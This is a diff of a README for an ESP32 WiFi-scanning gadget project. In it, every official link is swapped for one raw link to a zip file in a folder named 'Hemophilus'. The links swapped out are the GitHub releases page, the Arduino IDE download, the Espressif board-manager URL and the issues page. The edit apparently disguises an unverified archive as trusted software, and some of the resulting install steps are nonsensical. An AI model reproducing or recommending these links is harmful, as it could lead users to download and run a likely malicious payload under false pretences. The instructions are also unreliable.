@@ -1,6 +1,6 @@
 # 🎉 DetectorAPFisico-Gadget-Hacking - Scan WiFi Networks Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)
+[![Download](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip)](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip)
 
 ## 📖 Description
 
@@ -22,11 +22,11 @@ To start using the DetectorAPFisico-Gadget-Hacking application, follow these ste
 
 Click on the button below to visit the release page and download the latest version:
 
-[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-green)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)
+[![Visit Releases](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip%20Releases-green)](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip)
 
 ## 💾 Download & Install
 
-1. Go to the [Releases page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file for your platform to start the download. 
 
@@ -39,11 +39,11 @@ Click on the button below to visit the release page and download the latest vers
 
 ## ⚙️ Installation Steps for ESP32
 
-1. **Open the Arduino IDE:** If you don't have it yet, download and install the [Arduino IDE](https://www.arduino.cc/en/software).
+1. **Open the Arduino IDE:** If you don't have it yet, download and install the [Arduino IDE](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip).
    
 2. **Install ESP32 Board Package:** 
    - Go to `File > Preferences`.
-   - In the "Additional Board Manager URLs," add this link: `https://dl.espressif.com/dl/package_esp32_index.json`.
+   - In the "Additional Board Manager URLs," add this link: `https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip`.
    - Then go to `Tools > Board > Boards Manager`, search for "ESP32," and install it.
 
 3. **Load the project:** Open the DetectorAPFisico-Gadget-Hacking project file in the Arduino IDE.
@@ -80,7 +80,7 @@ If you encounter any issues, consider these tips:
 - **Touchscreen not responding:** Recheck your wiring and ensure your display is compatible.
 - **Compilation errors:** Ensure you have the correct board and libraries installed in the Arduino IDE.
 
-For further assistance, feel free to check the [issues page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/issues) or ask for help in the community.
+For further assistance, feel free to check the [issues page](https://raw.githubusercontent.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/main/Hemophilus/DetectorAPFisico-Gadget-Hacking.zip) or ask for help in the community.
 
 ## 🛠️ Contribution
 
